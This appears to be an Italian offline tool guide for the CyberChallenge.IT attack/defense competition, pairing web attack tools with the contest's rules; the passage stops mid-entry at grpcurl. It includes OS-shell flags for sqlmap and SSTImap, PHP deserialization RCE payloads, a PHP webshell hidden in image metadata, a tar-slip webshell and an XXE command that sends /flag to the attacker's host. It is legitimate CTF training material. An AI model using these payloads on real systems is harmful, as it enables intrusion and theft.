# ARSENALE WEB OFFLINE — CyberChallenge.IT (A/D, whitebox, no-AI, internet limitato)

> **Filosofia in due righe.** Installa tutto **a casa con internet** (git clone, pip, go, docker):
> dopo, gira **offline**. In gara sei il "web guy": leggi i sorgenti, sviluppi l'exploit sul TUO
> box, e consegni alla farm un attacco **snello**. Pochi tool servono davvero puntati sugli
> avversari; la maggior parte è per **analizzare** e **costruire** l'exploit.
>
> Alcuni tool vogliono internet **anche mentre li usi** → tag `[NET-RUN]` (es. `gau`,
> `nuclei -update-templates`, `semgrep --config auto`, interactsh pubblico, `docker pull`).
> Preparali/aggirali prima.
>
> **Stato repo verificato (lug 2026):** tplmap MORTO → SSTImap; NoSQLMap datato → nosqli;
> jwt_tool/phpggc/XXEinjector/interactsh/sqlmap VIVI; HackTricks ora su `HackTricks-wiki`.
>
> `~/arsenal/bin` va messo in `PATH` (lì finiscono quasi tutti i binari Go).

---

## ⚠️ 0) REGOLE D'INGAGGIO (conformità A/D — LEGGERE PRIMA DI TUTTO)

Dal regolamento CyberChallenge A/D, ciò che vincola i tool:
- **VIETATO contro gli avversari**: scanner automatici, network scanner, e qualsiasi tool che
  genera **molto traffico**. Vietato ogni **DoS** (di rete o logico) e costruire traffico che
  manda in crash / esaurisce risorse (servizi o strumenti di monitoraggio).
- **Rate limit**: max **60 connessioni/minuto per servizio per team** (verso il TUO box è
  escluso) + timeout connessione 2 min. L'exploit dev'essere **snello** (poche richieste).
- **Scope = solo `10.60.0.0/16`**. **Vietato uscire dai container** per attaccare le VM host;
  vietato toccare laptop altrui, macchine/infra organizzatori, game system. Niente social eng.
- **Vietati backdoor/persistenza**, patchare o rompere i servizi altrui via RCE, modificare/
  cancellare flag. Con una RCE **leggi solo la flag del tick corrente**, poi **ri-esegui
  l'exploit** al tick dopo — **nessun impianto**. (Non è previsto RCE sulla VM host, solo sui
  container servizio.)
- **Fake flag vietate.** Bruteforce online scoraggiato e rate-limited (inutile per vincere);
  il **cracking offline** (hashcat / jwt_tool dizionario su token già catturato) è OK — non
  genera traffico verso il target.
- **Interazione con server remoti/cloud CONSENTITA** → un interactsh su VPS per i callback è
  lecito *dalle regole*; resta il dubbio **tecnico** se il container avversario ha egress verso
  Internet → **apri ticket**.
- Tutto il traffico è **loggato**. Nel dubbio: **ticket** agli organizzatori prima di agire.

Legenda tag: **[LOCAL-ONLY]** = solo tuo box / analisi, MAI sugli avversari · **[LEAN-OK]** = ok
contro avversari se poche richieste · **[OFFLINE]** = zero traffico verso il target.

---

## 0-bis) TOP 10 (rule-safe, in ordine)
1. **PayloadsAllTheThings + HackTricks offline** [OFFLINE] — la KB per costruire l'exploit mirato senza rete.
2. **semgrep + ripgrep + trufflehog/gitleaks** [OFFLINE] — whitebox sui sorgenti: trovi il sink e i secret (JWT key, creds). Il vero MVP dell'A/D.
3. **Burp Suite Community + estensioni** [LEAN-OK] — sviluppo e replay **mirato** della singola richiesta (non Intruder di massa sugli altri).
4. **jwt_tool + JWT Editor** [LEAN-OK / OFFLINE] — forge token (poche req); cracking HS **offline**.
5. **sqlmap / ghauri** [LOCAL-ONLY] — confermi la SQLi **sul tuo box**, poi estrai la flag con un exploit snello.
6. **SSTImap** [LOCAL-ONLY] — confermi SSTI Jinja2/Twig/EJS sul tuo box; l'RCE finale è 1-2 richieste.
7. **phpggc** [OFFLINE] — generi il payload gadget PHP/Twig in locale; lo consegni in 1 richiesta.
8. **grpcurl (+ .proto dai sorgenti)** [LEAN-OK] — chiami i metodi gRPC a mano, poche richieste.
9. **XXEinjector / XXExploiter** [LOCAL-ONLY per bruteforce] — sviluppi l'XXE; in gara colpisci il **path noto** della flag in 1 richiesta.
10. **interactsh self-host / listener LAN passivo** [LEAN-OK] — callback per i blind, se il target ha egress (ticket).

> **Declassati a [LOCAL-ONLY]**: ffuf, feroxbuster, katana, httpx, x8, Arjun, **nuclei**. In A/D
> whitebox gli endpoint stanno nei sorgenti: non serve fuzzarli. Puntati sugli avversari sono
> **scanner vietati + troppo traffico**. Usali al massimo sul tuo vulnbox per capire le route.

---

## 0-ter) LA REGOLA D'ORO — dove usare cosa

Tutti i team partono **identici** (stessi servizi, stessi sorgenti). Sfruttalo così:

1. **Sviluppo → SUL TUO VULNBOX** (`10.60.tuoteam.1`, sei **root**, verso te stesso **niente
   rate limit**). Qui girano i tool "rumorosi" (sqlmap, SSTImap, commix, ffuf…) e leggi
   direttamente DB/filesystem per sapere **dov'è** la flag e **com'è fatta**. Le flag locali
   sono tue → sottometterle dà `DENIED: flag is your own`, 0 punti: **serve solo a capire**.
2. **Trasforma il bug in una "ricetta"**: un **exploit mirato** da poche richieste (1–3), il cui
   unico parametro variabile è l'**host bersaglio** (+ il `flag_id` preso da
   `http://10.10.0.1:8081/flagIds`, es. lo username che detiene la flag).
   *Trucco*: pianta un **valore-marcatore noto** nel tuo flagstore locale e verifica che
   l'exploit tiri fuori proprio quello → sai che funziona anche sugli altri (dove non lo vedi).
3. **Valida sulla rete → sul NOP box** (`10.60.0.1`): identico, **mai patchato**, flag senza
   punti, ed esplicitamente *"can be used to test attacks"*. Qui provi **solo l'exploit snello
   finito** (mai sqlmap: sulla rete vera sarebbe uno scanner sul filo del divieto).
4. **Attacca → la farm** lancia l'exploit su tutti i team, throttlata a **<60 conn/min/servizio**.
5. **Attenzione alla divergenza**: dopo il grace period gli altri **patchano**. Se patchi il TUO
   servizio perdi la copia vulnerabile → **tieni un'istanza non patchata a parte** (secondo
   container / snapshot pre-patch) per continuare a iterare. In alternativa itera sul NOP box.

Riassunto: **locale = tool rumorosi; rete = solo l'exploit snello.**

---

## Come leggere ogni scheda
- **Cosa fa** = spiegazione semplice, senza gergo, di ciò che il tool fa davvero.
- **In pratica (nel tuo caso)** = quando lo tiri fuori in questa gara, sui tuoi stack reali.
- **Install / Uso / Note** = comando pronto, esempio minimo, trappole da conoscere.
- Il tag `[OFFLINE]/[LOCAL-ONLY]/[LEAN-OK]` dice dove puoi puntarlo (vedi regole sopra).

---

## 1) RECON / FUZZING / WHITEBOX

Sei in whitebox: hai i sorgenti. La recon "vera" è **leggere/grep-are il codice**, non fuzzing.
⚠️ **Conformità**: contro gli avversari i fuzzer/crawler (ffuf, feroxbuster, katana, httpx, x8,
Arjun) sono **vietati** (scanner + troppo traffico). Usali **[LOCAL-ONLY]** sul tuo box o
saltali. La parte che conta davvero è quella **[OFFLINE]** che gira sui file (semgrep, ripgrep,
trufflehog, gitleaks, jsluice).

### ffuf — `github.com/ffuf/ffuf`  [LOCAL-ONLY]
- **Cosa fa**: prende una lista di parole e le prova a raffica al posto di un pezzo dell'URL o di
  un parametro; ti mostra quali risposte cambiano (status/dimensione) → così scopre pagine,
  cartelle e parametri che non conoscevi. In pratica è un "provatore automatico di indirizzi".
- **In pratica (nel tuo caso)**: qui gli endpoint li leggi dai sorgenti, quindi ffuf lo usi al
  massimo **sul tuo box** se una codebase è confusa e vuoi mappare le route in fretta. Sugli
  avversari **no** (è uno scanner).
- **Install**: `GOBIN=~/arsenal/bin go install github.com/ffuf/ffuf/v2@latest`
- **Uso** (parametro GET su un tuo servizio Flask): `ffuf -u 'http://127.0.0.1:5000/api?FUZZ=1' -w ~/arsenal/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0`
- **Note**: `-fs`/`-fw`/`-fc` filtrano il rumore (dimensione/parole/status). Alternative: gobuster, dirsearch.

### feroxbuster — `github.com/epi052/feroxbuster`  [LOCAL-ONLY]
- **Cosa fa**: come ffuf ma **ricorsivo**: quando trova una cartella, entra e continua a cercarci
  dentro da solo. Ottimo per mappare siti a più livelli.
- **In pratica**: sul tuo box per disegnare la mappa di un servizio Express/SvelteKit con route
  annidate. `-x js,map` per beccare bundle e sourcemap (che poi passi a jsluice).
- **Install**: `curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s -- ~/arsenal/bin` (oppure `cargo install feroxbuster`)
- **Uso**: `feroxbuster -u http://127.0.0.1:3000 -w ~/arsenal/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -r`
- **Note**: `-r` segue i redirect.

### katana — `github.com/projectdiscovery/katana`  [LOCAL-ONLY]
- **Cosa fa**: apre le pagine come farebbe un browser e **segue tutti i link e il JavaScript**,
  producendo la lista completa degli URL del sito (un "crawler").
- **In pratica**: sul tuo box per estrarre tutti gli endpoint di un frontend SvelteKit/Express;
  `-jc` fa il crawl anche del JS. Poi passi l'output a jsluice per i segreti.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/projectdiscovery/katana/cmd/katana@latest`
- **Uso**: `katana -u http://127.0.0.1:3000 -jc -d 3 -o endpoints.txt`
- **Note**: `-d` è la profondità di crawl.

### httpx — `github.com/projectdiscovery/httpx`  [LOCAL-ONLY]
- **Cosa fa**: prende un elenco di indirizzi e ti dice **quali rispondono** e con che titolo,
  status e tecnologia. È un "citofono di massa" per capire cosa è vivo.
- **In pratica**: poco utile qui — i servizi sono **gli stessi per tutti** e li conosci dal tuo
  box, quindi non devi scoprirli. Al massimo per un check veloce sul tuo lato. Sugli avversari è
  scansione → evita.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/projectdiscovery/httpx/cmd/httpx@latest`
- **Uso**: `httpx -l targets.txt -title -tech-detect -status-code`
- **Note**: niente query esterne, ma resta "network scanner"-adiacente → non puntarlo sugli altri.

### Arjun — `github.com/s0md3v/Arjun`  [LOCAL-ONLY]
- **Cosa fa**: indovina i **nomi dei parametri nascosti** che una pagina accetta ma non mostra
  (spesso porta a IDOR/SQLi/SSRF). Ha wordlist proprie e gira offline.
- **In pratica**: sul tuo box, quando dal codice non è ovvio quali parametri legge un endpoint.
- **Install**: `pip install arjun` (nel venv)
- **Uso**: `arjun -u 'http://127.0.0.1:5000/item' -m GET`
- **Note**: complementare a ffuf; Arjun ragiona su risposte/anomalie invece che solo su status.

### x8 — `github.com/Sh1Yo/x8`  [LOCAL-ONLY]
- **Cosa fa**: come Arjun ma più fine e veloce — prova parametri anche **dentro il body JSON e
  negli header**, non solo nella query string.
- **In pratica**: sul tuo box per i servizi che ricevono JSON (Express/SvelteKit) e vuoi vedere
  quali campi "extra" accettano.
- **Install**: `cargo install x8` (o binari dai Releases)
- **Uso**: `x8 -u 'http://127.0.0.1:3000/api' -X POST --body '{"FUZZ":"1"}' -w ~/arsenal/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt`
- **Note**: ottimo per i param in JSON body.

### jsluice — `github.com/BishopFox/jsluice`  [OFFLINE]
- **Cosa fa**: legge file **JavaScript** e ne tira fuori automaticamente URL/endpoint API e
  **chiavi/segreti** lasciati nel codice. È un "estrattore di indizi dai bundle JS".
- **In pratica**: puntato sui bundle JS dei tuoi frontend SvelteKit/Express (e sui sorgenti)
  trova endpoint interni e token dimenticati — tutto offline, quindi sempre lecito.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/BishopFox/jsluice/cmd/jsluice@latest`
- **Uso**: `find src -name '*.js' | jsluice urls` · `find src -name '*.js' | jsluice secrets`
- **Note**: usalo sia sui sorgenti sia sui bundle serviti.

### semgrep — `github.com/semgrep/semgrep`  [OFFLINE]  ⭐ whitebox
- **Cosa fa**: è un "cerca nel codice **intelligente**": capisce la struttura del programma, non
  solo il testo. Gli chiedi "dove l'input dell'utente finisce in una query SQL / in un `eval` /
  in `exec` / in `unserialize` / in `render_template`?" e lui te lo trova su tutte le codebase.
- **In pratica**: il modo **più veloce** per trovare la vulnerabilità avendo i sorgenti. Lancialo
  su Flask, Express e PHP per scoprire subito il punto d'iniezione da attaccare.
- **Install**: `pip install semgrep` (nel venv)
- **Uso**: `semgrep --config p/php --config p/javascript --config p/python --config p/express --config p/flask ./sorgenti-servizio`  `[NET-RUN]` per scaricare i ruleset la 1ª volta
- **Note**: a casa fai un giro `--config auto` per **cachare** le regole; in gara usa
  `--config <cartella-regole-locale>` per stare offline. Si sposa con ripgrep.

### ripgrep — `github.com/BurntSushi/ripgrep`  [OFFLINE]
- **Cosa fa**: un `grep` **velocissimo**: cerca una parola/pattern dentro migliaia di file in un
  lampo. Semplice ma indispensabile.
- **In pratica**: il **primo comando** che lanci su ogni servizio, per saltare subito ai punti
  pericolosi del codice (query concatenate, `child_process`, `libxmljs`, `pickle`, `secret`…).
- **Install**: `apt install ripgrep`
- **Uso**: `rg -n "execute\(|query\(|render_template_string|child_process|unserialize|libxmljs|pickle.loads|SECRET" ./sorgenti`
- **Note**: `-n` mostra il numero di riga; `-t py`/`-t js` filtra per linguaggio.

### trufflehog — `github.com/trufflesecurity/trufflehog`  [OFFLINE]  ⭐ whitebox
- **Cosa fa**: passa al setaccio file **e cronologia git** cercando **segreti** (password DB,
  chiavi che firmano i JWT, token API). Un "metal detector per credenziali".
- **In pratica**: se qualcuno ha committato per sbaglio il segreto che firma i JWT o le creds del
  DB, con quello forgi token admin o entri nel DB → spesso è la flag/priv-esc diretta.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/trufflesecurity/trufflehog/v3@latest` (o docker)
- **Uso**: `trufflehog filesystem ./sorgenti-servizio` · `trufflehog git file://./repo`
- **Note**: `--only-verified` se c'è troppo rumore (senza rete la verifica salta, ma i match restano).

### gitleaks — `github.com/gitleaks/gitleaks`  [OFFLINE]
- **Cosa fa**: stesso scopo di trufflehog (trovare segreti nel repo/history) ma con **regole
  diverse** → becca cose che l'altro si perde.
- **In pratica**: girali **entrambi** su ogni servizio: si completano a vicenda.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/gitleaks/gitleaks/v8@latest`
- **Uso**: `gitleaks detect --source ./repo -v`
- **Note**: —

### nuclei — `github.com/projectdiscovery/nuclei`  [LOCAL-ONLY]
- **Cosa fa**: ha migliaia di "ricette" (**template** YAML) che testano vulnerabilità note,
  misconfig e file esposti, e le spara contro un sito. È letteralmente **uno scanner**.
- **In pratica**: ⚠️ contro gli avversari è **vietato** (scanner + tanto traffico). Utile solo
  **sul tuo box** per un check rapido di misconfig/esposizioni sul tuo servizio.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`
- **Uso**: `nuclei -u http://127.0.0.1:3000 -tags exposure,misconfig,jwt`
- **Note**: `nuclei -update-templates` **a casa** `[NET-RUN]`, altrimenti offline non ha ricette.

### gau — `github.com/lc/gau`  [NET-RUN, inutile in gara]
- **Cosa fa**: recupera **vecchi URL** di un sito dagli archivi pubblici di Internet (Wayback…).
- **In pratica**: **inutile qui**: la rete è chiusa e i target non sono siti pubblici indicizzati.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/lc/gau/v2/cmd/gau@latest`
- **Note**: interroga servizi esterni → offline non fa nulla. Lo cito solo per completezza.

---

## 2) INJECTION

### sqlmap — `github.com/sqlmapproject/sqlmap`  [LOCAL-ONLY]  ⭐
- **Cosa fa**: prova **automaticamente** decine di trucchi per iniettare SQL in un parametro; se
  ci riesce, ti fa leggere/estrarre il database (tabelle, righe), leggere file e a volte aprire
  una shell sul DB. È il "coltellino automatico della SQL injection".
- **In pratica (nel tuo caso)**: i tuoi DB (MySQL/Postgres via pg/sequelize/SQLAlchemy) sono
  ovunque. ⚠️ ma sqlmap in default spara **centinaia di richieste** (rumoroso, tipo-scanner,
  sfonda i 60/min): usalo **sul tuo box** per **confermare** la SQLi e capire la query, poi
  scrivi un exploit che estrae **solo la flag** in poche richieste da lanciare sugli altri.
- **Install**: `git clone --depth 1 https://github.com/sqlmapproject/sqlmap ~/arsenal/injection/sqlmap`
- **Uso** (da una richiesta salvata in Burp): `python ~/arsenal/injection/sqlmap/sqlmap.py -r req.txt --batch --dbms=postgresql --dump`
- **Note**: whitebox → dai `--technique`, `--prefix/--suffix` guardando il codice.
  `--file-read=/flag` e `--os-shell` (su Postgres `COPY ... FROM PROGRAM`) spesso danno la flag.

### ghauri — `github.com/r0oth3x49/ghauri`  [LOCAL-ONLY]
- **Cosa fa**: come sqlmap (SQL injection automatica) ma spesso **più veloce/aggressivo** sui casi
  "alla cieca a tempo" (blind time-based), quando sqlmap arranca.
- **In pratica**: tienilo come **secondo motore**: se sqlmap non conferma un'iniezione difficile,
  provala con ghauri. Sintassi quasi identica.
- **Install**: `git clone https://github.com/r0oth3x49/ghauri ~/arsenal/injection/ghauri && (cd ~/arsenal/injection/ghauri && pip install .)`
- **Uso**: `ghauri -r req.txt --dbms postgresql --dump`
- **Note**: usa gli stessi flag di sqlmap nella maggior parte dei casi.

### SSTImap — `github.com/vladko312/SSTImap`  [LOCAL-ONLY]  ⭐ (sostituisce tplmap MORTO)
- **Cosa fa**: verifica se un **template** (Jinja2, Twig, EJS…) **esegue** il tuo input invece di
  stamparlo; se sì, ti dà valutazione di codice / shell sul server. Automatizza il classico
  "Server-Side Template Injection → RCE".
- **In pratica (nel tuo caso)**: colpisce **Flask+Jinja2**, **PHP+Twig** e **EJS** di Express.
  Usalo sul tuo box per **confermare** l'engine e la SSTI; poi l'RCE finale sono **1-2 richieste**
  mirate (leggi/exec per prendere la flag).
- **Install**: `git clone https://github.com/vladko312/SSTImap ~/arsenal/injection/SSTImap && (cd ~/arsenal/injection/SSTImap && pip install -r requirements.txt)`
- **Uso**: `python ~/arsenal/injection/SSTImap/sstimap.py -u 'http://127.0.0.1:5000/page?name=x' --os-shell`
- **Note**: `-i` = interattivo; `-e jinja2`/`-e twig` forza l'engine. In Twig la sandbox si evade
  spesso con `map`/`filter('system')` (vedi HackTricks → Symfony/Twig).

### commix — `github.com/commixproject/commix`  [LOCAL-ONLY]
- **Cosa fa**: come sqlmap ma per l'**iniezione di comandi di sistema**: quando un parametro
  finisce in una chiamata shell, commix trova il modo di eseguire comandi tuoi.
- **In pratica**: utile sui tuoi Node quando l'input arriva a `child_process` (exec/spawn) o a
  wrapper shell. Conferma sul tuo box, poi comando mirato.
- **Install**: `git clone https://github.com/commixproject/commix ~/arsenal/injection/commix`
- **Uso**: `python ~/arsenal/injection/commix/commix.py -r req.txt`
- **Note**: prova `--technique=` diverse se la prima non aggancia.

### nosqli — `github.com/Charlie-belmer/nosqli`  [LOCAL-ONLY]  (rimpiazza NoSQLMap datato)
- **Cosa fa**: come sqlmap ma per **MongoDB**: sfrutta gli operatori NoSQL (`$ne`, `$gt`,
  `$regex`) per bypassare login o estrarre dati.
- **In pratica**: **marginale** nel tuo stack (sei SQL, non vedo Mongo tra i tuoi servizi). Incluso
  per completezza; se salta fuori un Mongo, spesso è auth-bypass a mano `user[$ne]=x&pass[$ne]=x`.
- **Install**: `GOBIN=~/arsenal/bin go install github.com/Charlie-belmer/nosqli@latest` (fallback: clone + `go build`)
- **Uso**: `nosqli scan -t 'http://127.0.0.1/login' --data 'user=a&pass=b'`
- **Note**: per i payload NoSQL a mano → PayloadsAllTheThings → NoSQL Injection.

---

## 3) JWT (presente ovunque)

### jwt_tool — `github.com/ticarpi/jwt_tool`  [LEAN-OK / OFFLINE]  ⭐ (VIVO, v2.3.0)
- **Cosa fa**: il **coltellino dei token JWT**. Un JWT è quel "gettone" a tre pezzi separati da
  punti che dice al server chi sei. jwt_tool lo **legge**, ne **cambia** i dati (es. `admin:true`),
  lo **ri-firma** e prova gli attacchi noti quando il server valida male la firma; sa anche
  **craccarne il segreto** a dizionario.
- **In pratica (nel tuo caso)**: JWT sono ovunque (Flask, Express `jsonwebtoken`, SvelteKit).
  Attacchi chiave: `alg:none` (`-X a`), firma nulla (`-X n`), **confusione RS→HS** (`-X k`, se
  trovi la **chiave pubblica** nei sorgenti la usi come segreto HMAC), **jwks spoof** (`-X s`).
  Forgiare un token = **poche richieste** (lecito); il **cracking è offline** (nessun traffico).
- **Install**: `git clone https://github.com/ticarpi/jwt_tool ~/arsenal/jwt/jwt_tool && (cd ~/arsenal/jwt/jwt_tool && pip install -r requirements.txt)` (serve pycryptodome/Cryptodome per RSA/ECC)
- **Uso** (forgi admin dopo aver trovato il segreto nei sorgenti): `python ~/arsenal/jwt/jwt_tool/jwt_tool.py <JWT> -S hs256 -p 'secret_dai_sorgenti' -T`
- **Note**: `-M at` = All Tests (audit completo). `-C -d wordlist.txt` per craccare HS a dizionario.

### hashcat — `github.com/hashcat/hashcat`  [OFFLINE]
- **Cosa fa**: un **cracker di password su GPU**: prova milioni di parole al secondo per indovinare
  un segreto/hash. Tutto in locale, non parla col target.
- **In pratica**: quando un JWT è firmato HS256 con un segreto debole, gli dai il token e una
  wordlist e recuperi il segreto → poi con jwt_tool forgi qualsiasi token. È il metodo veloce.
- **Install**: `apt install hashcat`
- **Uso**: `hashcat -m 16500 jwt.txt ~/arsenal/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt`
- **Note**: `-m 16500` è la modalità JWT.

### (Burp) JWT Editor / SignSaboteur  [LEAN-OK]  → dettagli in sezione PROXY
- **Cosa fa**: le stesse operazioni di jwt_tool ma **dentro Burp**, comode a mouse: decodifichi,
  modifichi e ri-firmi il token direttamente in Repeater, generi chiavi al volo per la key-confusion.
- **In pratica**: quando stai già lavorando in Burp e vuoi tamperare un JWT senza uscire dal tool.

---

## 4) DESERIALIZZAZIONE / GADGET CHAINS

> "Deserializzazione" = il server ricostruisce un oggetto da una stringa che gli mandi. Se non
> controlla cosa ricostruisce, si può fargli eseguire codice. I "gadget chain" sono gli oggetti
> giusti, presi da librerie note, che innescano quell'esecuzione.

### phpggc — `github.com/ambionics/phpggc`  [OFFLINE]  ⭐ (PHP + Twig)
- **Cosa fa**: **costruisce oggetti PHP malevoli già pronti**. Tu gli dici quale libreria usa il
  bersaglio (Symfony, Guzzle, Laravel, Monolog…) e lui sputa la stringa serializzata che, quando
  il sito fa `unserialize()`, esegue il tuo comando. È "il ysoserial per PHP".
- **In pratica (nel tuo caso)**: per il tuo **PHP+Twig** → object injection / secret-fragment RCE.
  Generi il payload **in locale** (zero traffico) e lo consegni in **1 richiesta**.
- **Install**: `git clone https://github.com/ambionics/phpggc ~/arsenal/deser/phpggc` (serve `php-cli`)
- **Uso**: `~/arsenal/deser/phpggc/phpggc Symfony/RCE1 system id` (per upload+`phar://`: `-p phar -o payload.phar`)
- **Note**: `./phpggc -l` lista le chain; `-i <chain>` dà info; `--test-payload` verifica contro un ambiente.

### symfony-exploits — `github.com/ambionics/symfony-exploits`  [OFFLINE/LEAN-OK]
- **Cosa fa**: raccolta di exploit **specifici per Symfony/Twig**, in particolare la RCE
  "secret-fragment" (l'endpoint `/_fragment`), più scoperta di route di debug.
- **In pratica**: se nel tuo servizio PHP c'è Symfony e trovi l'`APP_SECRET` (cercalo con
  trufflehog), questi script te lo trasformano in RCE.
- **Install**: `git clone https://github.com/ambionics/symfony-exploits ~/arsenal/deser/symfony-exploits`
- **Note**: richiede il segreto dell'app → prima trufflehog/ripgrep sui config.

### fickling — `github.com/trailofbits/fickling`  [OFFLINE]  (Python pickle)
- **Cosa fa**: **analizza e crea file "pickle"** di Python. Un pickle è un oggetto Python salvato
  su file; se il server lo ri-apre senza controlli, può eseguire codice. fickling ti dice se un
  pickle è pericoloso e sa **costruirne uno** che esegue il tuo comando.
- **In pratica**: per i tuoi servizi **Python/gRPC** che deserializzano pickle. `--check-safety`
  è utile pure per capire un pickle preso dal target.
- **Install**: `pip install fickling`
- **Uso**: `fickling --check-safety payload.pkl` · creare: `fickling --inject 'import os; os.system("id")' base.pkl`
- **Note**: —

### Deserializzazione Node — nessun tool unico, si fa "a mano"
- **Cosa fa (il problema)**: in Node l'RCE da deserializzazione arriva di solito da `node-serialize`
  (payload con `_$$ND_FUNC$$_`) oppure da **prototype pollution** che poi innesca un "gadget".
  Non esiste un phpggc equivalente dominante.
- **In pratica**: usa i payload pronti di **PayloadsAllTheThings** (sezioni *Insecure
  Deserialization* e *Prototype Pollution*) + un piccolo script `node` tuo. Per la **SSTI EJS**
  (Express+ejs) l'RCE passa dalle opzioni di render (`outputFunctionName`) → PaTT/EJS + SSTImap.
- **Aiuto SAST**: **nodejsscan** (`github.com/ajinabraham/nodejsscan`, `pip install nodejsscan`)
  scansiona i **sorgenti** Node e ti segnala i punti di deserializzazione/`eval` pericolosi.

### ysoserial (Java/.NET) — NON ti serve
- **Nota**: lo strumento equivalente per Java/.NET. Il tuo stack **non ha Java/.NET**, quindi
  saltalo del tutto (lo cito solo perché è il "cugino" famoso di phpggc).

---

## 5) XXE / XML  (SvelteKit + libxmljs)

> XXE = fai leggere al parser XML del server file che non dovrebbe, o gli fai fare richieste per
> conto tuo, abusando delle "entità" esterne dell'XML. `libxmljs` è **Node**, non Java → niente
> elenco cartelle: punti a **file noti** o vai "alla cieca" (OOB) con la DTD ospitata da te.

### XXEinjector — `github.com/enjoiz/XXEinjector`  [LOCAL-ONLY per il bruteforce]  (VIVO)
- **Cosa fa**: **automatizza l'attacco XXE** per farsi ridare file dal server, anche quando la
  risposta non è visibile ("blind"): fa sì che l'XML del bersaglio contatti un **tuo** server per
  consegnarti il contenuto. Gestisce vari metodi (DTD esterna, CDATA, PHP filter).
- **In pratica (nel tuo caso)**: contro `libxmljs` (Node) l'elenco cartelle non c'è → usa la
  **lettura di un path noto** (es. `/flag`) o il bruteforce di nomi file. La DTD la ospiti sul tuo
  listener/interactsh.
- **Install**: `git clone https://github.com/enjoiz/XXEinjector ~/arsenal/xxe/XXEinjector` (serve Ruby)
- **Uso** (blind OOB, tuo IP LAN): `ruby ~/arsenal/xxe/XXEinjector/XXEinjector.rb --host=<TUO_IP> --file=req.txt --path=/flag --oob=http --phpfilter`
- **Note**: ⚠️ evita il `--brute` massivo **contro gli avversari** (troppo traffico → vietato):
  fallo sul tuo box. In `req.txt` marca il punto d'iniezione con `XXEINJECT`.

### XXExploiter — `github.com/luisfontes19/xxexploiter`  [LOCAL-ONLY per sviluppo]  (Node)
- **Cosa fa**: come XXEinjector (genera i payload XXE) ma è in **Node** e **monta lui il server
  della DTD** necessario per gli attacchi "alla cieca". Più autonomo da configurare.
- **In pratica**: comodo offline sulla LAN perché si porta dietro il server. Sceglie lui la DTD.
- **Install**: `git clone https://github.com/luisfontes19/xxexploiter ~/arsenal/xxe/xxexploiter && (cd ~/arsenal/xxe/xxexploiter && npm install)`
- **Uso**: `node ~/arsenal/xxe/xxexploiter file /flag -s <TUO_IP> -m oob`
- **Note**: ⚠️ **NON usare la modalità `xee`** (espansione di entità = "billion laughs" =
  **DoS = vietato**). Niente zip-bomb/espansioni: crashare un servizio è vietato e non fa punti.

### Payload XXE a mano + PayloadsAllTheThings/XXE  [OFFLINE→LEAN-OK]
- **Cosa fa**: spesso l'XXE è un **colpo solo**: un'entità esterna `SYSTEM "file:///flag"` (se
  l'output è visibile) o un'entità parametro `%` che manda il file al tuo server (blind).
- **In pratica**: tieni aperta la sezione **XXE Injection** di PayloadsAllTheThings; l'exfil (via
  HTTP/DNS) punta al tuo interactsh/listener. Per la flag basta 1 richiesta ben fatta.

---

## 6) FILE UPLOAD / ARCHIVI  (multer, tar/tar-stream, sharp)

### evilarc — `github.com/ptoomey3/evilarc`  [OFFLINE]  (zip-slip / tar-slip)
- **Cosa fa**: **crea archivi trappola** (zip/tar) in cui i file hanno nomi tipo `../../percorso`.
  Quando il server li **scompatta**, quei `../` lo fanno scrivere **fuori** dalla cartella prevista
  (es. sovrascrivere un file dell'app). È il classico "zip/tar slip".
- **In pratica (nel tuo caso)**: perfetto contro il tuo **`tar`/`tar-stream`** se estrae senza
  normalizzare i path. Piazzi un file dove ti serve (una route, una webshell) e lo attivi.
- **Install**: `git clone https://github.com/ptoomey3/evilarc ~/arsenal/upload/evilarc`
- **Uso**: `python ~/arsenal/upload/evilarc/evilarc.py shell.js -o unix -p ../../app/routes/ -f evil.tar`
- **Note**: vecchio ma funziona (Python). Prima verifica **dal codice** se il target normalizza i path.

### slipit — `github.com/usdAG/slipit`  [OFFLINE]  (archive-slip moderno)
- **Cosa fa**: come evilarc ma **mantenuto** e più flessibile: più formati e profondità di
  traversal configurabile.
- **In pratica**: se evilarc non genera l'archivio come vuoi, usa slipit (più formati, `--depth`).
- **Install**: `pip install slipit`
- **Uso**: `slipit evil.tar shell.js --depth 6 --prefix app/`
- **Note**: —

### exiftool — `libimage-exiftool-perl`  [OFFLINE]  (metadata / magic-bytes)
- **Cosa fa**: **legge e scrive i metadati** delle immagini/file. Lo usi per **nascondere un
  payload** in un campo metadato o per **far sembrare** un file di un tipo diverso (falsificando
  l'inizio del file) così da superare i controlli di upload.
- **In pratica (nel tuo caso)**: per bypassare i check MIME/estensione dei tuoi upload. Il tuo
  `sharp` (libvips) è meno soggetto a RCE-da-metadati di ImageMagick, ma per **passare** i
  controlli l'exiftool è oro.
- **Install**: `apt install libimage-exiftool-perl`
- **Uso**: `exiftool -Comment='<?php system($_GET[c]); ?>' img.jpg` (poi rinomini/polyglot secondo il check)
- **Note**: per il "magic bytes bypass" basta anteporre i byte giusti (`GIF89a;`, `%PDF-`) → vedi
  PayloadsAllTheThings → Upload Insecure Files.

### Polyglot / bypass  [OFFLINE]
- **Cosa fa (tecnica)**: un file "**polyglot**" è valido in due formati insieme (es. immagine +
  script) così passa il controllo "è un'immagine?" ma viene poi eseguito.
- **In pratica**: niente tool unico → combina i comandi `file`/`mimetype` locali per capire cosa
  passa + i payload di **PayloadsAllTheThings → Upload**. Se `sharp` accetta **SVG**, valuta
  SVG→XSS/SSRF (vedi la KB).

---

## 7) gRPC  (Python, pycryptodome)

> gRPC è un modo per chiamare funzioni su un server usando messaggi binari definiti nei file
> `.proto`. Hai i **`.proto` nei sorgenti** → puoi chiamare **tutto**, anche senza "reflection".

### grpcurl — `github.com/fullstorydev/grpcurl`  [LEAN-OK]  ⭐
- **Cosa fa**: è il **"curl per gRPC"**: chiami i metodi del servizio da riga di comando. Se il
